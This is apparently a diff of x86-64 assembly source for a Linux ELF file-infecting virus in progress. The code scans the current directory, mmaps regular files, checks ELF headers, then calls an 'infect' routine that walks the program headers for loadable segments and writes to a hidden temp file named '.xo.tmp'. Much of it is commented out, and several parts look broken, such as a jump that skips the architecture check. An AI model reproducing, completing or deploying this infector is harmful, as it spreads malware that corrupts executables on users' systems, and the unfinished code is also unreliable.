@@ -1,6 +1,5 @@
 BITS 64
 
-
 section .bss
 	struc linuxdirent
 		.d_ino:			resq 1
@@ -8,23 +7,24 @@ section .bss
 		.d_reclen:		resb 2
 		.d_nameq:		resb 1
 		.d_type:		resb 1
-;		.d_padding:		resb 1
 	endstruc
 	
-	struc file_stat
+	struc filestat
 		.st_dev			resq 1	;ID of dev containing file
 		.st_ino			resq 1	;inode #
-		.st_mode		resq 1	;protection
-		.st_nlink		resq 1	;# of hard links
-		.st_uid			resq 1	;user id of owner
-		.st_gid			resq 1	;group Id of owner
+		.st_mode		resd 1	;pn
+		.st_nlink		resd 1	;# of hard links
+		.st_uid			resd 1	;user id of owner
+		.st_gid			resd 1	;group Id of owner
 		.st_rdev		resq 1 	;dev ID 
-		.st_size		resq 1	;total size in bytes
+		.st_pad1		resq 1 	;padding 
+		.st_size		resd 1	;total size in bytes
 		.st_blksize		resq 1	; blocksize for fs i/o
+		.st_pad2		resd 1	;padding
 		.st_blocks		resq 1	;# of 512b blocks allocated
 		.st_atime		resq 1	;time of last file access
 		.st_mtime		resq 1	;time of last file mod
-		.st_ctime		resq 1	;time of last file status changea
+		.st_ctime		resq 1	;time of last file status change
 	endstruc
 
 	struc elf_ehdr
@@ -34,7 +34,8 @@ section .bss
 		.ei_version		resb 1		; 
 		.ei_osabi		resb 1		; 
 		.ei_abiversion	resb 1		; 
-		.ei_padding		resb 6		; bytes 10-15
+		.ei_padding		resb 6		; bytes 9-14
+		.ei_nident		resb 1		; size of ident array
 		.e_type			resb 2		; uint16_t, bytes 16-17
 		.e_machine		resb 2		; uint16_t, bytes 18-19
 		.e_version		resw 1		; uint32_t
@@ -145,9 +146,9 @@ checkptloadfaillen equ $-checkptloadfail
 
 ;****************************************************************************************
 
-elf_header: times 4 dq 0
-file_stat_temp: times 13 dq 0
-
+;elf_header: times 4 dq 0
+;file_stat_temp: times 17 dq 0
+;elf_filesize: dq 0 
 evaddr: dq 0
 
 oshoff: dq 0
@@ -204,8 +205,8 @@ DT_REG 			equ 0x8
 PT_LOAD 		equ 0x0100
 
 ;MAX_RDENT_BUF:	db 0x200 dup (?)
-MAX_RDENT_BUF	times 0x400 db 0 
-MAX_RDENT_BUF_SIZE equ 0x400
+MAX_RDENT_BUF	times 0x800 db 0 
+MAX_RDENT_BUF_SIZE equ 0x800
 
 num_dir_entries resq 0x0
 root_dirent:	dq 0 
@@ -217,8 +218,8 @@ root_dirent:	dq 0
 section .text
 global _start
 _start:
-	;push rbp
-	;mov rbp, rsp
+	push rbp
+	mov rbp, rsp
 	sub rsp, 0x1000
 	mov r14, rsp
 
@@ -263,7 +264,7 @@ _getdirents:
 
 
 	mov r8, rax					;# of dirent entries in r8
-	mov [root_dirent], rsi
+;	mov [root_dirent], rsi
 	mov qword [r14 + 500], rax		;save # of dir entries to local var on stack
 ;****************************************************************************************
 ; close - syscall 0x3
@@ -343,13 +344,11 @@ check_file:
 
 		cmp rax, 0
 		jb checknext
-;		test rax, rax
-;		js checknext
 		
 		mov r9, rax
 		mov r8, rax
-		mov qword [r14 + 400], rax
-		mov qword [fd], rax
+		mov [r14 + 144], rax
+		mov [fd], rax
 	;	pop rcx
 		
 		xor r12, r12
@@ -362,24 +361,47 @@ check_file:
 			jne .copy_filename
 
 		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
-	;;	lea r13, [r14 + 200]
-	;;	call _write
+		;lea r13, [r14 + 200]
+		;call _write
 		xor rax, rax
-		;mov [r14 + 500], rax				;save fd to opened file at designated spot on the stack
+;		mov [r14 + 500], rax				;save fd to opened file at designated spot on the stack
 	
-	;	push r9
+		push r9
 	check_filename:
 		cmp qword [r14+200], "."
 		je checknext
 
+;	read_elf_header:
+		;mov rdi, [fd]
+;		mov rdi, r9
+	;	lea rsi, [elf_header]
+;		lea rsi, [r14 + elf_ehdr]
+;		mov rdx, 64
+;		xor r10, r10
+;		mov rax, SYS_PREAD64
+;		syscall
+	
 	get_filestat:
-		lea rsi, [r14 + file_stat]
+									;size for mmap == e_shoff + (e_shnum * e_shentsize)
+;		mov qword rsi, [elf_header + 40] ; e_shoff
+		;mov qword rsi, [r14+ elf_ehdr.e_shoff] ; e_shoff
+		;mov [elf_filesize], rsi; e_shoff
+		
+		;xor rax, rax
+		;mov ax, word [elf_header + 54]	;e_shnum
+		;mov r10w, word [elf_header + 56]	;e_shnum * e_shentsize
+		;mul r10w
+		;mov dword [elf_filesize], eax
+		;add rsi, dword [ax]
+		;mov [elf_filesize], rsi
+		;;mov rsi, r14
+		lea rsi, [r14 + filestat]
+		;mov rsi, [r14 + file_stat]
 		;lea rsi, [file_stat_temp]
 		mov rdi, r8
 		;mov rdi, [fd]
 		mov rax, SYS_FSTAT
 		syscall
-	
 		;tbqf extracting this field and checking it is an infuriating piece of logic that is not working as expected
 		; since this is so annoying, I'm skipping this check for rn
 	
@@ -403,9 +425,11 @@ check_file:
 		;                  int fd, off_t offset);
 	mmap_file:
 		xor rdi, rdi			;set RDI to NULL
-		mov qword rsi, [r14 + file_stat.st_size]
-		;mov qword rsi, [file_stat_temp + 56]
-		;mov rsi, [file_stat_temp + 56]
+		mov rsi, [r14 + filestat.st_size]
+		;mov rsi, [r14 + 48]
+		;mov qword rsi, [file_stat_temp.st_size]
+		;mov qword rsi, [r14 + file_stat.st_size]
+		;mov rsi, [r14 + filestat + 48]
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
 		mov r10, MAP_PRIVATE
 		;mov r8, r9
@@ -416,20 +440,12 @@ check_file:
 		
 		cmp rax, 0
 		jb checknext
+		pop r9
 	
 		mov r8, rax
 		;mov [r14 + 800 + elf_ehdr], rax			;rax contains address of new mapping upon return from syscall
 		mov [r14 + 800], rax			;rax contains address of new mapping upon return from syscall
-	;	pop r9
 		push rax
-	;read_elf_header:
-		;mov rdi, [fd]
-	;	mov rdi, r9
-	;	lea rsi, [elf_header]
-	;	mov rdx, 64
-	;	xor r10, r10
-	;	mov rax, SYS_PREAD64
-	;	syscall
 
 	close_curr_file:
 		;mov rdi, [r14+400]
@@ -446,9 +462,9 @@ check_file:
 	check_elf_header_etype:
 		lea r13, checkelf_etype_fail
 		mov r12, checkelf_etype_faillen
-		cmp word [rax + elf_ehdr.e_type], 0x0200
+		cmp word [rax + elf_ehdr.e_type], 0x0002
 		je check_elf_header_magic_bytes
-		cmp word [rax + elf_ehdr.e_type], 0x0300
+		cmp word [rax + elf_ehdr.e_type], 0x0003
 		je check_elf_header_magic_bytes
 		jnz checknext
 
@@ -464,20 +480,24 @@ check_file:
 		;cmp dword [elf_header], 0x464c457f
 		jnz checknext
 		
-		;;lea r13, checkelfpass
-		;;mov r12, checkelfpasslen
-		;;call _write
+;		lea r13, checkelfpass
+;		mov r12, checkelfpasslen
+;		call _write
 	check_elf_header_64bit:
 		;cmp dword [r14+800+elf_ehdr.e_ident+4], ELFCLASS64
 		lea r13, check64fail
 		mov r12, check64faillen
-		;cmp byte [elf_header+4], ELFCLASS64
-		cmp byte [rax + elf_ehdr+4], ELFCLASS64
+		cmp byte [rax + elf_ehdr.e_ident+4], ELFCLASS64
+	;	cmp byte [elf_header+4], ELFCLASS64
+		;cmp byte [rax + elf_ehdr+4], ELFCLASS64
+		;cmp byte [rax + elf_ehdr+4], ELFCLASS64
+;		cmp byte [rax + elf_ehdr.ei_class], ELFCLASS64
 		jne checknext
 		
-		;;lea r13, check64pass
-		;;mov r12, check64passlen
-		;;call _write
+		lea r13, check64pass
+		mov r12, check64passlen
+		call _write
+		jmp ready2infect
 ;		jmp _restore
 	
 	check_elf_header_arch:
@@ -485,15 +505,18 @@ check_file:
 		mov r12, checkarchfaillen
 		;cmp byte [elf_header+18], 0x3e
 		cmp byte [rax + elf_ehdr +18], 0x3e
+		;cmp byte [rax + elf_ehdr.e_machine], 0x3e
+		;cmp word [rax + elf_ehdr.e_machine], 0x03e
 		jne checknext
 		
-		;;lea r13, checkarchpass
-		;;mov r12, checkarchpasslen
-		;;call _write
+		lea r13, checkarchpass
+		mov r12, checkarchpasslen
+		call _write
 		;jmp _restore
 		
 	ready2infect:
-		;push rax
+		push rax
+		;mov [r14 + 0xa00], rax
 		call infect	
 		jmp painting
 
@@ -504,6 +527,12 @@ check_file:
 		;lea r13, checkfile_dtreg_fail
 		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
 		call _write
+		
+		mov rdi, fd
+		mov rsi, [r14 + filestat.st_size]
+		mov rax, SYS_MUNMAP
+		syscall
+		
 		pop rcx
 		add cx, [rcx + r14 + 600 + linuxdirent.d_reclen]
 		cmp qword rcx, [r14 + 500]
@@ -595,12 +624,15 @@ payload:
 ;****************************************************************************************
 
 infect:
-	;sub rsp, 0x8
-	push rbp
-	mov rbp, rsp
-	mov r13, rax
-	;jmp frankenstein_elf
-	lea r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
+;	sub rsp, 0x8
+	;push rbp
+	;mov rbp, rsp
+;	lea r13, [rax + elf_ehdr]
+	;;mov r13, rax
+	mov r13, [r14+ 800]				;location on stack where we saved address returned from mmap syscall
+	jmp frankenstein_elf
+	mov r12, rax
+	lea r12, [rax + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
 	lea r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
 ;	mov rdx, checkphdrstartlen
 ;	lea rsi, checkphdrstart
@@ -632,7 +664,8 @@ infect:
 			;cmp rcx, 0
 			;jg .mod_subsequent_phdr		
 			;cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
-			cmp word [r12 + elf_phdr.p_type], 0x0100			
+			cmp word [r12 + elf_phdr.p_type], 0x1			
+			;cmp [r12 ], word 0x1
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
 				mov rdx, checkptloadpasslen
@@ -751,8 +784,6 @@ infect:
 
 frankenstein_elf:
 	;mov r13, rax
-	;push 0	
-	;mov byte [r14+ 0xa00], 0x0
 	mov rax, 0x00706d742e6f782e		;temp filename = ".xo.tmp\0"
 	mov [r14 + 0x800], rax
 	lea rdi, [r14 + 0x800]			;name of file in rdi
@@ -766,17 +797,16 @@ frankenstein_elf:
 
 	;write ELF header to temp file
 
-	mov rdx, 64
+	mov rdx, 512
+	;mov rdx, 64
 	mov rsi, r13					;r13 contains pointer to mmap'd file
-	mov rdi, r9
-	xor r10, r10
 	mov rax, SYS_WRITE
-	;mov rax, SYS_PWRITE64
 	syscall
 	
 	;munmap file from work area
+	;mov qword rsi, [elf_filesize]
 ;	mov rdi, r13
-;	mov qword rsi, [r14 + file_stat.st_size]
+;	mov rsi, [r14 + filestat.st_size]
 ;	mov rax, SYS_MUNMAP
 ;	syscall
 
@@ -788,9 +818,9 @@ frankenstein_elf:
 
 
 fin_infect:
-	;add rsp, 0x8
-	mov rsp, rbp
-	pop rbp
+;	add rsp, 0x8
+	;mov rsp, rbp
+	;pop rbp
 	ret
 
 
@@ -798,8 +828,8 @@ fin_infect:
 ;;restore stack to original state
 _restore:
 	add rsp, 0x1000
-	;mov rsp, rbp
-	;pop rbp
+	mov rsp, rbp
+	pop rbp
 	
 ;exit
 _end:
